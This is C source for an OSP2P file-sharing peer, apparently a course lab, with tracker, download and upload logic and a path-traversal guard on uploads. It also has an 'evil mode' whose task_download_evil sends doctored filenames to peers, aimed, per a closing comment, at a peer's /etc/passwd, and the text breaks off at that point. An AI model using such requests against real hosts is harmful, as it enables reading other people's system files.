// -*- mode: c++ -*-
#define _BSD_EXTENSION
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdarg.h>
#include <ctype.h>
#include <sys/socket.h>
#include <dirent.h>
#include <netdb.h>
#include <assert.h>
#include <pwd.h>
#include <time.h>
#include <limits.h>
#include <stdbool.h>

#include <pthread.h>

#include "reconstruct.h"

#include "md5.h"
#include "osp2p.h"

int evil_mode;			// nonzero iff this peer should behave badly
int parallel_mode;
int seed_mode;

static struct in_addr listen_addr;	// Define listening endpoint
static int listen_port;

#define MAX_PARALLEL_OPERATIONS 8
#define MAX_TOTAL_DL_SIZE 10000000

/*****************************************************************************
 * TASK STRUCTURE
 * Holds all information relevant for a peer or tracker connection, including
 * a bounded buffer that simplifies reading from and writing to peers.
 */

#define TASKBUFSIZ	4096	// Size of task_t::buf
#define FILENAMESIZ	256	// Size of task_t::filename

typedef enum tasktype {		// Which type of connection is this?
	TASK_TRACKER,		// => Tracker connection
	TASK_PEER_LISTEN,	// => Listens for upload requests
	TASK_UPLOAD,		// => Upload request (from peer to us)
	TASK_DOWNLOAD		// => Download request (from us to peer)
} tasktype_t;

typedef struct peer {		// A peer connection (TASK_DOWNLOAD)
	char alias[TASKBUFSIZ];	// => Peer's alias
	struct in_addr addr;	// => Peer's IP address
	int port;		// => Peer's port number
	struct peer *next;
} peer_t;

typedef struct task {
	tasktype_t type;	// Type of connection

	int peer_fd;		// File descriptor to peer/tracker, or -1
	int disk_fd;		// File descriptor to local file, or -1

	char buf[TASKBUFSIZ];	// Bounded buffer abstraction
	unsigned head;
	unsigned tail;
	bool full;              // Solves ambiguity with head==tail
	size_t total_written;	// Total number of bytes written
				// by write_to_taskbuf

	char filename[FILENAMESIZ];	// Requested filename
	char disk_filename[FILENAMESIZ]; // Local filename (TASK_DOWNLOAD)

	peer_t *peer_list;	// List of peers that have 'filename'
				// (TASK_DOWNLOAD).  The task_download
				// function initializes this list;
				// task_pop_peer() removes peers from it, one
				// at a time, if a peer misbehaves.
} task_t;

typedef struct
{
	task_t *tracker_task, *t;
	pthread_t thread;
	void* next;
} pd_prop_node_t;

typedef struct
{
    pthread_t thread;
    task_t* listen_task;
    void* next;
} pu_prop_node_t;

pthread_mutex_t counter_mutex;
int u_thread_counter;

void
dispatch_pupload(task_t* listen_task);

void
dispatch_pdownload(const task_t* tracker_task, const char** fnames, size_t fname_cnt);

void
dispatch_ppdownload(const task_t* tracker_task, const char** fnames, size_t fname_cnt);

// task_new(type)
//	Create and return a new task of type 'type'.
//	If memory runs out, returns NULL.
static task_t *task_new(tasktype_t type)
{
	task_t *t = (task_t *) malloc(sizeof(task_t));
	if (!t) {
		errno = ENOMEM;
		return NULL;
	}

	t->type = type;
	t->peer_fd = t->disk_fd = -1;
	t->head = t->tail = 0;
	t->full = false;
	t->total_written = 0;
	t->peer_list = NULL;

	strcpy(t->filename, "");
	strcpy(t->disk_filename, "");

	return t;
}

// task_pop_peer(t)
//	Clears the 't' task's file descriptors and bounded buffer.
//	Also removes and frees the front peer description for the task.
//	The next call will refer to the next peer in line, if there is one.
static void task_pop_peer(task_t *t)
{
	if (t) {
		// Close the file descriptors and bounded buffer
		if (t->peer_fd >= 0)
			close(t->peer_fd);
		if (t->disk_fd >= 0)
			close(t->disk_fd);
		t->peer_fd = t->disk_fd = -1;
		t->head = t->tail = 0;
		t->full = false;
		t->total_written = 0;
		t->disk_filename[0] = '\0';

		// Move to the next peer
		if (t->peer_list) {
			peer_t *n = t->peer_list->next;
			free(t->peer_list);
			t->peer_list = n;
		}
	}
}

// task_free(t)
//	Frees all memory and closes all file descriptors relative to 't'.
static void task_free(task_t *t)
{
	if (t) {
		do {
			task_pop_peer(t);
		} while (t->peer_list);
		free(t);
	}
}


/******************************************************************************
 * TASK BUFFER
 * A bounded buffer for storing network data on its way into or out of
 * the application layer.
 */

typedef enum taskbufresult {		// Status of a read or write attempt.
	TBUF_ERROR = -1,		// => Error; close the connection.
	TBUF_END = 0,			// => End of file, or buffer is full.
	TBUF_OK = 1,			// => Successfully read data.
	TBUF_AGAIN = 2			// => Did not read data this time.  The
					//    caller should wait.
} taskbufresult_t;

//#define REDEFINITION_READ_WRITE

#ifdef REDEFINITION_READ_WRITE

taskbufresult_t read_to_taskbuf_fixed(int fd, task_t *t)
{
    t->head = (t->head % TASKBUFSIZ);
    t->tail = (t->tail % TASKBUFSIZ);
    ssize_t amt = 0, amt2 = 0;

    // Buffer is full; can't do much else
    if(t->tail == t->head && t->full)
        return TBUF_END;

    if(t->tail < t->head)
    {
        amt += read(fd, &t->buf[t->tail], t->head - t->tail);

        if (amt == -1 && (errno == EINTR || errno == EAGAIN
        || errno == EWOULDBLOCK))
            return TBUF_AGAIN;
        else if(amt == -1)
            return TBUF_ERROR;
        else if(amt == 0)
            return TBUF_END;
    }

    if(t->tail >= t->head)
    {
        if(TASKBUFSIZ - t->tail)
            amt += read(fd, &t->buf[t->tail], TASKBUFSIZ - t->tail);

        if (amt == -1 && (errno == EINTR || errno == EAGAIN
        || errno == EWOULDBLOCK))
            return TBUF_AGAIN;
        else if(amt == -1)
            return TBUF_ERROR;
        else if(amt == 0)
            return TBUF_END;

        if(amt < (ssize_t)(TASKBUFSIZ - t->tail))
            goto done;

        if(t->head)
            amt2 += read(fd, &t->buf[0], t->head);

        if (amt2 == -1 && (errno == EINTR || errno == EAGAIN
        || errno == EWOULDBLOCK))
            return TBUF_AGAIN;
        else if(amt2 == -1)
            return TBUF_ERROR;
        else if(amt2 == 0)
            return TBUF_END;
    }

    amt += amt2;

done:

    t->tail = (t->tail + amt) % TASKBUFSIZ;
    t->full = t->tail == t->head;

    return TBUF_OK;
}

taskbufresult_t write_from_taskbuf_fixed(int fd, task_t *t)
{
    t->head = (t->head % TASKBUFSIZ);
    t->tail = (t->tail % TASKBUFSIZ);
    ssize_t amt = 0, amt2 = 0;

    // Buffer is empty; can't do much else
    if(t->tail == t->head && !t->full)
        return TBUF_END;

    if(t->head < t->tail)
    {
        amt += write(fd, &t->buf[t->head], t->tail - t->head);

        if (amt == -1 && (errno == EINTR || errno == EAGAIN
        || errno == EWOULDBLOCK))
            return TBUF_AGAIN;
        else if(amt == -1)
            return TBUF_ERROR;
        else if(amt == 0)
            return TBUF_END;
    }

    if(t->head >= t->tail)
    {
        if(TASKBUFSIZ - t->head)
            amt += write(fd, &t->buf[t->head], TASKBUFSIZ - t->head);

        if (amt == -1 && (errno == EINTR || errno == EAGAIN
        || errno == EWOULDBLOCK))
            return TBUF_AGAIN;
        else if(amt == -1)
            return TBUF_ERROR;
        else if(amt == 0)
            return TBUF_END;

        if(amt < (ssize_t)(TASKBUFSIZ - t->head))
            goto done;

        if(t->tail)
            amt2 += write(fd, &t->buf[0], t->tail);

        if (amt2 == -1 && (errno == EINTR || errno == EAGAIN
        || errno == EWOULDBLOCK))
            return TBUF_AGAIN;
        else if(amt2 == -1)
            return TBUF_ERROR;
        else if(amt2 == 0)
            return TBUF_END;
    }

    amt += amt2;

done:

    t->total_written += amt;
    t->head = (t->head + amt) % TASKBUFSIZ;
    t->full = !(t->tail == t->head);

    return TBUF_OK;
}

#else

#define read_to_taskbuf_fixed read_to_taskbuf
#define write_from_taskbuf_fixed write_from_taskbuf

// read_to_taskbuf(fd, t)
//	Reads data from 'fd' into 't->buf', t's bounded buffer, either until
//	't's bounded buffer fills up, or no more data from 't' is available,
//	whichever comes first.  Return values are TBUF_ constants, above;
//	generally a return value of TBUF_AGAIN means 'try again later'.
//	The task buffer is capped at TASKBUFSIZ.
taskbufresult_t read_to_taskbuf(int fd, task_t *t)
{
	unsigned headpos = (t->head % TASKBUFSIZ);
	unsigned tailpos = (t->tail % TASKBUFSIZ);
	ssize_t amt;

	if (t->head == t->tail || headpos < tailpos)
		amt = read(fd, &t->buf[tailpos], TASKBUFSIZ - tailpos);
	else
		amt = read(fd, &t->buf[tailpos], headpos - tailpos);

	if (amt == -1 && (errno == EINTR || errno == EAGAIN
			  || errno == EWOULDBLOCK))
		return TBUF_AGAIN;
	else if (amt == -1)
		return TBUF_ERROR;
	else if (amt == 0)
		return TBUF_END;
	else {
		t->tail += amt;
		return TBUF_OK;
	}
}

// write_from_taskbuf(fd, t)
//	Writes data from 't' into 't->fd' into 't->buf', using similar
//	techniques and identical return values as read_to_taskbuf.
taskbufresult_t write_from_taskbuf(int fd, task_t *t)
{
	unsigned headpos = (t->head % TASKBUFSIZ);
	unsigned tailpos = (t->tail % TASKBUFSIZ);
	ssize_t amt;

	if (t->head == t->tail)
		return TBUF_END;
	else if (headpos < tailpos)
		amt = write(fd, &t->buf[headpos], tailpos - headpos);
	else
		amt = write(fd, &t->buf[headpos], TASKBUFSIZ - headpos);

	if (amt == -1 && (errno == EINTR || errno == EAGAIN
			  || errno == EWOULDBLOCK))
		return TBUF_AGAIN;
	else if (amt == -1)
		return TBUF_ERROR;
	else if (amt == 0)
		return TBUF_END;
	else {
		t->head += amt;
		t->total_written += amt;

		if(t->total_written > MAX_TOTAL_DL_SIZE)
            die("Too much data transferred; exceeded limit!");

		return TBUF_OK;
	}
}

#endif

/******************************************************************************
 * NETWORKING FUNCTIONS
 */

// open_socket(addr, port)
//	All the code to open a network connection to address 'addr'
//	and port 'port' (or a listening socket on port 'port').
int open_socket(struct in_addr addr, int port)
{
	struct sockaddr_in saddr;
	socklen_t saddrlen;
	int fd, ret, yes = 1;

	if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1
	    || fcntl(fd, F_SETFD, FD_CLOEXEC) == -1
	    || setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
		goto error;

	memset(&saddr, 0, sizeof(saddr));
	saddr.sin_family = AF_INET;
	saddr.sin_addr = addr;
	saddr.sin_port = htons(port);

	if (addr.s_addr == INADDR_ANY) {
		if (bind(fd, (struct sockaddr *) &saddr, sizeof(saddr)) == -1
		    || listen(fd, 4) == -1)
			goto error;
	} else {
		if (connect(fd, (struct sockaddr *) &saddr, sizeof(saddr)) == -1)
			goto error;
	}

	return fd;

    error:
	if (fd >= 0)
		close(fd);
	return -1;
}


/******************************************************************************
 * THE OSP2P PROTOCOL
 * These functions manage connections to the tracker and connections to other
 * peers.  They generally use and return 'task_t' objects, which are defined
 * at the top of this file.
 */

// read_tracker_response(t)
//	Reads an RPC response from the tracker using read_to_taskbuf().
//	An example RPC response is the following:
//
//      FILE README                             \ DATA PORTION
//      FILE osptracker.cc                      | Zero or more lines.
//      ...                                     |
//      FILE writescan.o                        /
//      200-This is a context line.             \ MESSAGE PORTION
//      200-This is another context line.       | Zero or more CONTEXT lines,
//      ...                                     | which start with "###-", and
//      200 Number of registered files: 12      / then a TERMINATOR line, which
//                                                starts with "### ".
//                                                The "###" is an error code:
//                                                200-299 indicate success,
//                                                other codes indicate error.
//
//	This function empties the task buffer, then reads into it until it
//	finds a terminator line.  It returns the number of characters in the
//	data portion.  It also terminates this client if the tracker's response
//	is formatted badly.  (This code trusts the tracker.)
static size_t read_tracker_response(task_t *t)
{
	char *s;
	size_t split_pos = (size_t) -1, pos = 0;
	t->head = t->tail = 0;

	while (1) {
		// Check for whether buffer is complete.
		for (; pos+3 < t->tail; pos++)
			if ((pos == 0 || t->buf[pos-1] == '\n')
			    && isdigit((unsigned char) t->buf[pos])
			    && isdigit((unsigned char) t->buf[pos+1])
			    && isdigit((unsigned char) t->buf[pos+2])) {
				if (split_pos == (size_t) -1)
					split_pos = pos;
				if (pos + 4 >= t->tail)
					break;
				if (isspace((unsigned char) t->buf[pos + 3])
				    && t->buf[t->tail - 1] == '\n') {
					t->buf[t->tail] = '\0';
					return split_pos;
				}
			}

		// If not, read more data.  Note that the read will not block
		// unless NO data is available.
		int ret = read_to_taskbuf_fixed(t->peer_fd, t);
		if (ret == TBUF_ERROR)
			die("tracker read error");
		else if (ret == TBUF_END)
			die("tracker connection closed prematurely!\n");
	}
}


// start_tracker(addr, port)
//	Opens a connection to the tracker at address 'addr' and port 'port'.
//	Quits if there's no tracker at that address and/or port.
//	Returns the task representing the tracker.
task_t *start_tracker(struct in_addr addr, int port)
{
	struct sockaddr_in saddr;
	socklen_t saddrlen;
	task_t *tracker_task = task_new(TASK_TRACKER);
	size_t messagepos;

	if ((tracker_task->peer_fd = open_socket(addr, port)) == -1)
		die("cannot connect to tracker");

	// Determine our local address as seen by the tracker.
	saddrlen = sizeof(saddr);
	if (getsockname(tracker_task->peer_fd,
			(struct sockaddr *) &saddr, &saddrlen) < 0)
		error("getsockname: %s\n", strerror(errno));
	else {
		assert(saddr.sin_family == AF_INET);
		listen_addr = saddr.sin_addr;
	}

	// Collect the tracker's greeting.
	messagepos = read_tracker_response(tracker_task);
	message("* Tracker's greeting:\n%s", &tracker_task->buf[messagepos]);

	return tracker_task;
}


// start_listen()
//	Opens a socket to listen for connections from other peers who want to
//	upload from us.  Returns the listening task.
task_t *start_listen(void)
{
	struct in_addr addr;
	task_t *t;
	int fd;
	addr.s_addr = INADDR_ANY;

	// Set up the socket to accept any connection.  The port here is
	// ephemeral (we can use any port number), so start at port
	// 11112 and increment until we can successfully open a port.
	for (listen_port = 11112; listen_port < 13000; listen_port++)
		if ((fd = open_socket(addr, listen_port)) != -1)
			goto bound;
		else if (errno != EADDRINUSE)
			die("cannot make listen socket");

	// If we get here, we tried about 200 ports without finding an
	// available port.  Give up.
	// TODO: make this behave differently when listening ports are exhausted; return NULL?
	die("Tried ~200 ports without finding an open port, giving up.\n");

    bound:
	message("* Listening on port %d\n", listen_port);

	t = task_new(TASK_PEER_LISTEN);
	t->peer_fd = fd;
	return t;
}


// register_files(tracker_task, myalias)
//	Registers this peer with the tracker, using 'myalias' as this peer's
//	alias.  Also register all files in the current directory, allowing
//	other peers to upload those files from us.
static void register_files(task_t *tracker_task, const char *myalias)
{
	DIR *dir;
	struct dirent *ent;
	struct stat s;
	char buf[PATH_MAX];
	size_t messagepos;
	assert(tracker_task->type == TASK_TRACKER);

	// Register address with the tracker.
	osp2p_writef(tracker_task->peer_fd, "ADDR %s %I:%d\n",
		     myalias, listen_addr, listen_port);

	messagepos = read_tracker_response(tracker_task);
	message("* Tracker's response to our IP address registration:\n%s",
		&tracker_task->buf[messagepos]);
	if (tracker_task->buf[messagepos] != '2') {
		message("* The tracker reported an error, so I will not register files with it.\n");
		return;
	}

	// Register files with the tracker.
	message("* Registering our files with tracker\n");
	if ((dir = opendir(".")) == NULL)
		die("open directory: %s", strerror(errno));
	while ((ent = readdir(dir)) != NULL) {
		int namelen = strlen(ent->d_name);

		// don't depend on unreliable parts of the dirent structure
		// and only report regular files.  Do not change these lines.
		if (stat(ent->d_name, &s) < 0 || !S_ISREG(s.st_mode)
		    || (namelen > 2 && ent->d_name[namelen - 2] == '.'
			&& (ent->d_name[namelen - 1] == 'c'
			    || ent->d_name[namelen - 1] == 'h'))
		    || (namelen > 1 && ent->d_name[namelen - 1] == '~'))
			continue;

		osp2p_writef(tracker_task->peer_fd, "HAVE %s\n", ent->d_name);
		messagepos = read_tracker_response(tracker_task);
		if (tracker_task->buf[messagepos] != '2')
			error("* Tracker error message while registering '%s':\n%s",
			      ent->d_name, &tracker_task->buf[messagepos]);
	}

	closedir(dir);
}


// parse_peer(s, len)
//	Parse a peer specification from the first 'len' characters of 's'.
//	A peer specification looks like "PEER [alias] [addr]:[port]".
static peer_t *parse_peer(const char *s, size_t len)
{
	peer_t *p = (peer_t *) malloc(sizeof(peer_t));
	if (p) {
		p->next = NULL;
		if (osp2p_snscanf(s, len, "PEER %s %I:%d",
				  p->alias, &p->addr, &p->port) >= 0
		    && p->port > 0 && p->port <= 65535)
			return p;
	}
	free(p);
	return NULL;
}

#define PEER_LBUF_SIZ (2048)

// start_download(tracker_task, filename)
//	Return a TASK_DOWNLOAD task for downloading 'filename' from peers.
//	Contacts the tracker for a list of peers that have 'filename',
//	and returns a task containing that peer list.
task_t *start_download(task_t *tracker_task, const char *filename)
{
	char *s1, *s2;
	task_t *t = NULL;
	peer_t *p;
	size_t messagepos;
	assert(tracker_task->type == TASK_TRACKER);

	message("* Finding peers for '%s'\n", filename);

	osp2p_writef(tracker_task->peer_fd, "WANT %s\n", filename);

    char* peerlistbuf = (char*)malloc(PEER_LBUF_SIZ);
    ssize_t readbytes = 0;

    if (!(t = task_new(TASK_DOWNLOAD))) {
		error("* Error while allocating task");
		goto exit;
	}
	strcpy(t->filename, filename);
    char* nlpos = NULL;
    while(1)
    {
        ssize_t rval = read(tracker_task->peer_fd, peerlistbuf + readbytes, PEER_LBUF_SIZ - readbytes);

        if(rval == -1)
            die("failed to read peer info");

        readbytes += rval;

        do
        {
        nlpos = memchr(peerlistbuf, '\n', readbytes);
        if(nlpos == NULL)
            break;
        if(
            isdigit(peerlistbuf[0]) &&
            isdigit(peerlistbuf[1]) &&
            isdigit(peerlistbuf[2]) &&
            isspace(peerlistbuf[3]))
        {
            if(peerlistbuf[0] != '2')
            {
                peerlistbuf[PEER_LBUF_SIZ-1] = 0;
                error("* Tracker error message while requesting '%s':\n%s",
		      filename, &peerlistbuf);
            }
            goto exit;
        }

        if(!(p = parse_peer(peerlistbuf, nlpos - peerlistbuf)))
        {
            task_free(t);
            die("osptracker responded to WANT command with unexpected format!\n");
        }
        p->next = t->peer_list;
        t->peer_list = p;

        readbytes -= (nlpos - peerlistbuf + 1);


        memmove(peerlistbuf, nlpos + 1, readbytes);
        }while(nlpos != NULL);
    }
//	messagepos = read_tracker_response(tracker_task);
//	if (tracker_task->buf[messagepos] != '2') {
//		error("* Tracker error message while requesting '%s':\n%s",
//		      filename, &tracker_task->buf[messagepos]);
//		goto exit;
//	}
//
//	if (!(t = task_new(TASK_DOWNLOAD))) {
//		error("* Error while allocating task");
//		goto exit;
//	}
//	strcpy(t->filename, filename);
//
//	// add peers
//	s1 = tracker_task->buf;
//	while ((s2 = memchr(s1, '\n', (tracker_task->buf + messagepos) - s1))) {
//		if (!(p = parse_peer(s1, s2 - s1)))
//			die("osptracker responded to WANT command with unexpected format!\n");
//		p->next = t->peer_list;
//		t->peer_list = p;
//		s1 = s2 + 1;
//	}
//	if (s1 != tracker_task->buf + messagepos)
//		die("osptracker's response to WANT has unexpected format!\n");

 exit:
	return t;
}


// task_download(t, tracker_task)
//	Downloads the file specified by the input task 't' into the current
//	directory.  't' was created by start_download().
//	Starts with the first peer on 't's peer list, then tries all peers
//	until a download is successful.
static void task_download(task_t *t, task_t *tracker_task)
{
	int i, ret = -1;
	assert((!t || t->type == TASK_DOWNLOAD)
	       && tracker_task->type == TASK_TRACKER);

	// Quit if no peers, and skip this peer
	if (!t || !t->peer_list) {
		error("* No peers are willing to serve '%s'\n",
		      (t ? t->filename : "that file"));
		task_free(t);
		return;
	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr
		   && t->peer_list->port == listen_port)
		goto try_again;

	// Connect to the peer and write the GET command
	message("* Connecting to %s:%d to download '%s'\n",
		inet_ntoa(t->peer_list->addr), t->peer_list->port,
		t->filename);
	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
	if (t->peer_fd == -1) {
		error("* Cannot connect to peer: %s\n", strerror(errno));
		goto try_again;
	}
	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);

	// Open disk file for the result.
	// If the filename already exists, save the file in a name like
	// "foo.txt~1~".  However, if there are 50 local files, don't download
	// at all.
	for (i = 0; i < 50; i++) {
		if (i == 0)
			strcpy(t->disk_filename, t->filename);
		else
			sprintf(t->disk_filename, "%s~%d~", t->filename, i);
		t->disk_fd = open(t->disk_filename,
				  O_WRONLY | O_CREAT | O_EXCL, 0666);
		if (t->disk_fd == -1 && errno != EEXIST) {
			error("* Cannot open local file");
			goto try_again;
		} else if (t->disk_fd != -1) {
			message("* Saving result to '%s'\n", t->disk_filename);
			break;
		}
	}
	if (t->disk_fd == -1) {
		error("* Too many local files like '%s' exist already.\n\
* Try 'rm %s.~*~' to remove them.\n", t->filename, t->filename);
		task_free(t);
		return;
	}

	// Read the file into the task buffer from the peer,
	// and write it from the task buffer onto disk.
	while (1) {
		int ret = read_to_taskbuf_fixed(t->peer_fd, t);
		if (ret == TBUF_ERROR) {
			error("* Peer read error");
			goto try_again;
		} else if (ret == TBUF_END && t->head == t->tail)
			/* End of file */
			break;

		ret = write_from_taskbuf_fixed(t->disk_fd, t);
		if (ret == TBUF_ERROR) {
			error("* Disk write error");
			goto try_again;
		}
	}

	// Empty files are usually a symptom of some error.
	if (t->total_written > 0) {
		message("* Downloaded '%s' was %lu bytes long\n",
			t->disk_filename, (unsigned long) t->total_written);
		// Inform the tracker that we now have the file,
		// and can serve it to others!  (But ignore tracker errors.)
		if (strcmp(t->filename, t->disk_filename) == 0) {
			osp2p_writef(tracker_task->peer_fd, "HAVE %s\n",
				     t->filename);
			(void) read_tracker_response(tracker_task);
		}
		task_free(t);
		return;
	}
	error("* Download was empty, trying next peer\n");

    try_again:
	if (t->disk_filename[0])
		unlink(t->disk_filename);
	// recursive call
	task_pop_peer(t);
	task_download(t, tracker_task);
}

static void task_download_evil(task_t *t, task_t *tracker_task, const char* doctored_filename)
{
	int i, ret = -1;
	assert((!t || t->type == TASK_DOWNLOAD)
	       && tracker_task->type == TASK_TRACKER);

	// Quit if no peers, and skip this peer
	if (!t || !t->peer_list) {
		return;
	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr
		   && t->peer_list->port == listen_port)
		goto try_again;

	// Connect to the peer and write the GET command
	message("* EVIL: Connecting to %s:%d to download '%s'\n",
		inet_ntoa(t->peer_list->addr), t->peer_list->port,
		t->filename);
	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
	if (t->peer_fd == -1) {
		error("* EVIL: Cannot connect to peer: %s\n", strerror(errno));
		goto try_again;
	}
	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", doctored_filename);

    try_again:
        task_pop_peer(t);
        task_download_evil(t, tracker_task, doctored_filename);
}


// task_listen(listen_task)
//	Accepts a connection from some other peer.
//	Returns a TASK_UPLOAD task for the new connection.
static task_t *task_listen(task_t *listen_task)
{
	struct sockaddr_in peer_addr;
	socklen_t peer_addrlen = sizeof(peer_addr);
	int fd;
	task_t *t;
	assert(listen_task->type == TASK_PEER_LISTEN);

	fd = accept(listen_task->peer_fd,
		    (struct sockaddr *) &peer_addr, &peer_addrlen);
	if (fd == -1 && (errno == EINTR || errno == EAGAIN
			 || errno == EWOULDBLOCK))
		return NULL;
	else if (fd == -1)
		die("accept");

	message("* Got connection from %s:%d\n",
		inet_ntoa(peer_addr.sin_addr), ntohs(peer_addr.sin_port));

	t = task_new(TASK_UPLOAD);
	t->peer_fd = fd;
	return t;
}

int
count_occurences(const char* buf, int bufsize, const char* sstr, int sstrsize)
{
    if(sstrsize == 0)
        return 0;

    if(sstrsize < 0)
        sstrsize = strlen(sstr);

    if(bufsize < 0)
        bufsize = strlen(buf);

    int ret = 0;

    int offset;
    for(offset = 0; offset < bufsize-(sstrsize-1); offset++)
    {
        if(memcmp(buf+offset, sstr, sstrsize) == 0)
        {
            offset += (sstrsize-1);
            ret++;
        }
    }

    return ret;
}

// Check a filename (with its path) for shenanigans.
// Returns false if the path is absolute, not null-terminated,
// or if it ever pops above ./
bool
check_filename(const char* fname)
{
    // Check for null-termination
    bool has_end = false;
    int i;
    for(i = 0; i < FILENAMESIZ; i++)
    {
        if(fname[i] == 0)
        {
            has_end = true;
            break;
        }
    }

    if(!has_end)
        return false;

    // Check for absolute path
    if(fname[0] == '/')
        return false;

    // Check for going up out of the directory
    if(memcmp(fname, "../", 3) == 0)
        return false;

    int dir_level = 0;
    for(i = 0; (i < FILENAMESIZ) && (fname[i] != 0); i++)
    {
        if(memcmp(fname + i, "./", 2) == 0)
        {
            i += 1;
        }
        else if(memcmp(fname + i, "../", 3) == 0)
        {
            i += 2;
            dir_level--;
        }
        else if(fname[i] == '/')
        {
            if(!((i >= 1) && (fname[i-1] == '/')))
                dir_level++;
        }

        // NO! GTFO!
        if(dir_level < 0)
            return false;
    }

    return true;
}

// task_upload(t)
//	Handles an upload request from another peer.
//	First reads the request into the task buffer, then serves the peer
//	the requested file.
static void task_upload(task_t *t)
{
	assert(t->type == TASK_UPLOAD);
	// First, read the request from the peer.
	while (1) {
		int ret = read_to_taskbuf_fixed(t->peer_fd, t);
		if (ret == TBUF_ERROR) {
			error("* Cannot read from connection");
			goto exit;
		} else if (ret == TBUF_END
			   || (t->tail && t->buf[t->tail-1] == '\n'))
			break;
	}

	assert(t->head == 0);
	size_t max_buffer_size = FILENAMESIZ-1+strlen("GET  OSP2P\n");
	if(t->tail < max_buffer_size)
        max_buffer_size = t->tail;
	if (osp2p_snscanf(t->buf, max_buffer_size, "GET %s OSP2P\n", t->filename) < 0) {
		error("* Odd request %.*s\n", t->tail, t->buf);
		goto exit;
	}
	t->head = t->tail = 0;

	if(!check_filename(t->filename)) {
        error("* Bad filename %s", t->filename);
        goto exit;
    }

	t->disk_fd = open(t->filename, O_RDONLY);
	if (t->disk_fd == -1) {
		error("* Cannot open file %s", t->filename);
		goto exit;
	}

	message("* Transferring file %s\n", t->filename);
	// Now, read file from disk and write it to the requesting peer.
	while (1) {
		int ret = write_from_taskbuf_fixed(t->peer_fd, t);
		if (ret == TBUF_ERROR) {
			error("* Peer write error");
			goto exit;
		}

		ret = read_to_taskbuf_fixed(t->disk_fd, t);
		if (ret == TBUF_ERROR) {
			error("* Disk read error");
			goto exit;
		} else if (ret == TBUF_END && t->head == t->tail)
			/* End of file */
			break;
	}

	message("* Upload of %s complete\n", t->filename);

    exit:
	task_free(t);
}

#define BIGNAME_SIZE 512
#define BIGNAME_PAR_THREADS 10

void*
pdownload_worker(void* arg);

// main(argc, argv)
//	The main loop!
int main(int argc, char *argv[])
{
	task_t *tracker_task, *listen_task, *t;
	struct in_addr tracker_addr;
	int tracker_port;
	char *s;
	const char *myalias;
	struct passwd *pwent;

	parallel_mode = seed_mode = 0;

	// Default tracker is read.cs.ucla.edu
	osp2p_sscanf("131.179.80.139:11111", "%I:%d",
		     &tracker_addr, &tracker_port);
	if ((pwent = getpwuid(getuid()))) {
		myalias = (const char *) malloc(strlen(pwent->pw_name) + 20);
		sprintf((char *) myalias, "%s%d", pwent->pw_name,
			(int) time(NULL));
	} else {
		myalias = (const char *) malloc(40);
		sprintf((char *) myalias, "osppeer%d", (int) getpid());
	}

	// Ignore broken-pipe signals: if a connection dies, server should not
	signal(SIGPIPE, SIG_IGN);

	// Process arguments
    argprocess:
	if (argc >= 3 && strcmp(argv[1], "-t") == 0
	    && (osp2p_sscanf(argv[2], "%I:%d", &tracker_addr, &tracker_port) >= 0
		|| osp2p_sscanf(argv[2], "%d", &tracker_port) >= 0
		|| osp2p_sscanf(argv[2], "%I", &tracker_addr) >= 0)
	    && tracker_port > 0 && tracker_port <= 65535) {
		argc -= 2, argv += 2;
		goto argprocess;
	} else if (argc >= 2 && argv[1][0] == '-' && argv[1][1] == 't'
		   && (osp2p_sscanf(argv[1], "-t%I:%d", &tracker_addr, &tracker_port) >= 0
		       || osp2p_sscanf(argv[1], "-t%d", &tracker_port) >= 0
		       || osp2p_sscanf(argv[1], "-t%I", &tracker_addr) >= 0)
		   && tracker_port > 0 && tracker_port <= 65535) {
		--argc, ++argv;
		goto argprocess;
	} else if (argc >= 3 && strcmp(argv[1], "-d") == 0) {
		if (chdir(argv[2]) == -1)
			die("chdir");
		argc -= 2, argv += 2;
		goto argprocess;
	} else if (argc >= 2 && argv[1][0] == '-' && argv[1][1] == 'd') {
		if (chdir(argv[1]+2) == -1)
			die("chdir");
		--argc, ++argv;
		goto argprocess;
	} else if (argc >= 3 && strcmp(argv[1], "-b") == 0
		   && osp2p_sscanf(argv[2], "%d", &evil_mode) >= 0) {
		argc -= 2, argv += 2;
		goto argprocess;
	} else if (argc >= 2 && argv[1][0] == '-' && argv[1][1] == 'b'
		   && osp2p_sscanf(argv[1], "-b%d", &evil_mode) >= 0) {
		--argc, ++argv;
		goto argprocess;
	} else if (argc >= 2 && strcmp(argv[1], "-b") == 0) {
		evil_mode = 1;
		--argc, ++argv;
		goto argprocess;
	} else if (argc >= 2 && strcmp(argv[1], "-p") == 0) {
        parallel_mode = 1;
        --argc, ++argv;
        goto argprocess;
	}else if (argc >= 2 && strcmp(argv[1], "-s") == 0) {
        seed_mode = 1;
        --argc, ++argv;
        goto argprocess;
	}else if (argc >= 2 && (strcmp(argv[1], "--help") == 0
				 || strcmp(argv[1], "-h") == 0)) {
		printf("Usage: osppeer [-tADDR:PORT | -tPORT] [-dDIR] [-b]\n"
"Options: -tADDR:PORT  Set tracker address and/or port.\n"
"         -dDIR        Upload and download files from directory DIR.\n"
"         -b[MODE]     Evil mode!!!!!!!!\n");
		exit(0);
	}

    if(!evil_mode)
    {
        // Connect to the tracker and register our files.
        tracker_task = start_tracker(tracker_addr, tracker_port);
        if(!parallel_mode)
        {
            if(!seed_mode)
            {
                // First, download files named on command line.
                dispatch_pdownload(tracker_task, (const char**) &argv[1], argc-1);
            }
        }
        else
        {
            dispatch_ppdownload(tracker_task, (const char**) &argv[1], argc-1);
        }

        listen_task = start_listen();

        // Register files after the download so that this peer can immediately seed.
        register_files(tracker_task, myalias);

        // Then accept connections from other peers and upload files to them!
        while(1)
            dispatch_pupload(listen_task);

        // Release held file descriptors
        task_free(listen_task);
    }
    else
    {
        tracker_task = start_tracker(tracker_addr, tracker_port);

        pd_prop_node_t node;
        node.next = NULL;
        node.tracker_task = tracker_task;

        node.t = start_download(tracker_task, "cat1.jpg");

        // Download peer's /etc/passwd file
